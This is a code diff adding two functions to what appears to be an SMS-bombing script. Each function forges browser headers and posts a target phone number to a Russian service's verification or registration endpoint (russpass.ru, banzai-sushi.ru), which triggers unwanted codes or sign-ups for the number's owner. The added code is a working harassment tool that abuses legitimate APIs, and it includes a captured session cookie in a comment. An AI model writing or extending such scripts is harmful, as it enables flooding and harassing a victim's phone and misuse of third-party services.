@@ -566,6 +566,75 @@ def serv13():
         print(f"serv13 - {response.status_code}")
     except:
         print("serv13 - error")
+def serv14():
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
+            'Accept': 'application/json',
+            'Accept-Language': 'en-US,en;q=0.5',
+            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Referer': 'https://russpass.ru/',
+            'X-Platform-Version': 'web 3.0.0',
+            'is-logged-in': 'false',
+            'rqid': '6f32245c-b1d9-42f7-9132-7515e1263b77',
+            'Content-Type': 'application/json',
+            'secure-code': 'fb3bb33a-905d-4995-b4d3-a433eda2f205',
+            'Origin': 'https://russpass.ru',
+            'Connection': 'keep-alive',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-site',
+            'Priority': 'u=0',
+            # Requests doesn't support trailers
+            # 'TE': 'trailers',
+        }
+
+        params = {
+            'language': 'ru',
+        }
+
+        json_data = {
+            'login': PHONE,
+        }
+
+        response = requests.post('https://api.russpass.ru/user/v2/verify', params=params, headers=headers, json=json_data)
+        print(f"serv14 - {response.status_code}")
+    except:
+        print("serv14 - error")
+def serv15():
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://banzai-sushi.ru',
+            'Connection': 'keep-alive',
+            'Referer': 'https://banzai-sushi.ru/sety',
+            # 'Cookie': 'PHPSESSID=g19arn3lbgg7ksn2nc7kjr8o22; language=ru-ru; currency=RUB; promodate=20260408; display=list; _ga=GA1.2.1263868573.1775667122; _gid=GA1.2.1527243538.1775667122; _gat_UA-89928663-1=1; _ym_uid=1775667122324564224; _ym_d=1775667122; _ym_isad=2; _ym_visorc=w; _ga_W4GHH62KZ3=GS2.2.s1775667122$o1$g0$t1775667122$j60$l0$h0',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'Priority': 'u=0',
+        }
+
+        data = {
+            'reg_phone_number': f'+{PHONE}',
+            'reg_name': 'Алексей',
+            'reg_birthday': '2002-04-04',
+            '': '2002',
+            'reg_gender': '1',
+            'reg_region': '1',
+            'reg_politic': '1',
+            'registration_btn': 'Зарегистрироваться',
+        }
+
+        response = requests.post('https://banzai-sushi.ru/?route=api/registration', headers=headers, data=data)
+        print(f"serv15 - {response.status_code}")
+    except:
+        print("serv15 - error")
 # serv1()
 # serv2()
 # serv3()
@@ -578,4 +647,5 @@ def serv13():
 # serv10()
 # serv11()
 # serv12()
-#serv13()
+# serv13()
+# serv15()
